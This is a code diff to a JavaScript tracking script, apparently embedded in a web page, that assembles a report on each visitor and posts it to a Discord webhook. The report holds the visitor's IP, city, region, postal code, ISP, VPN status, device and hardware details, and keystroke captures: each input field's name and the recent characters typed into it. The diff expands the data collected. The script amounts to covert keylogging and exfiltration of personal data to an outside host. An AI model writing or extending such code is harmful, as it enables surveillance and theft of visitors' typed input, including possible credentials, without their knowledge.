@@ -111,31 +111,40 @@ function trackClicks() {
 // 4. DISCORD REPORTING (Enhanced)
 async function sendToDiscord(trigger, interaction) {
   try {
+    // Create description with line breaks instead of inline fields
+    let description = `
+🚀 **${getReportTitle(trigger)}**
+🌐 **Page:** ${trackingData.page}
+🔗 **Referrer:** ${trackingData.referrer || 'Direct'}
+📱 **Device:** ${trackingData.device.os} | ${trackingData.device.browser}
+📍 **Location:** ${trackingData.location.city}, ${trackingData.location.region} ${trackingData.location.country} ${trackingData.location.postal} 
+🆔 **IP:** ${trackingData.location.ip}
+🛡️ **VPN:** ${trackingData.location.vpn ? 'Yes' : 'No'}
+📡 **ISP:** ${trackingData.location.isp || 'Unknown'}
+🕒 **Timezone:** ${trackingData.location.timezone}
+🔎 **Screen size:** ${screen.width}x${screen.height}
+👆 **Is the Screen touch screen?:** ${ontouchstart}
+🍪 **Cookies Enabled?:** ${navigator.cookieEnabled}
+💻 **CPU Details:** ${navigator.hardwareConcurrency}
+🖥️ **Memory Details:** ${navigator.deviceMemory}
+`;
+
+    // Add interaction details if available
+    if (interaction) {
+      description += `\n\n${interaction.type === 'keystroke' ? '⌨️' : '🖱️'} **${interaction.type === 'keystroke' ? 'Input' : 'Click'}:**`;
+      if (interaction.type === 'keystroke') {
+        description += `\n  **Field:** ${interaction.field}\n  **Value:** \`${interaction.value.slice(-KEYSTROKE_THRESHOLD)}\``;
+      } else {
+        description += `\n  **Element:** ${interaction.element}\n  **Position:** X:${interaction.position.x}, Y:${interaction.position.y}`;
+      }
+    }
+
     const embed = {
       title: getReportTitle(trigger),
+      description: description,
       color: 0x3498db,
-      fields: [
-        { name: '🌐 Page', value: trackingData.page, inline: true },
-        { name: '🔗 Referrer', value: trackingData.referrer || 'Direct', inline: true },
-        { name: '📱 Device', value: `${trackingData.device.os} | ${trackingData.device.browser}`, inline: true },
-        { name: '📍 Location', value: `${trackingData.location.city}, ${trackingData.location.country}`, inline: true },
-        { name: '🆔 IP', value: trackingData.location.ip, inline: true },
-        { name: '🛡️ VPN', value: trackingData.location.vpn ? 'Yes' : 'No', inline: true },
-        { name: '📡 ISP', value: trackingData.location.isp || 'Unknown', inline: true },
-        { name: '🕒 Timezone', value: trackingData.location.timezone, inline: true }
-      ],
       timestamp: new Date().toISOString()
     };
-
-    // Add interaction-specific fields
-    if (interaction) {
-      embed.fields.push({
-        name: interaction.type === 'keystroke' ? '⌨️ Input' : '🖱️ Click',
-        value: interaction.type === 'keystroke' 
-          ? `**Field:** ${interaction.field}\n**Value:** \`${interaction.value.slice(-KEYSTROKE_THRESHOLD)}\``
-          : `**Element:** ${interaction.element}\n**Position:** X:${interaction.position.x}, Y:${interaction.position.y}`
-      });
-    }
 
     await fetch(DISCORD_WEBHOOK, {
       method: 'POST',
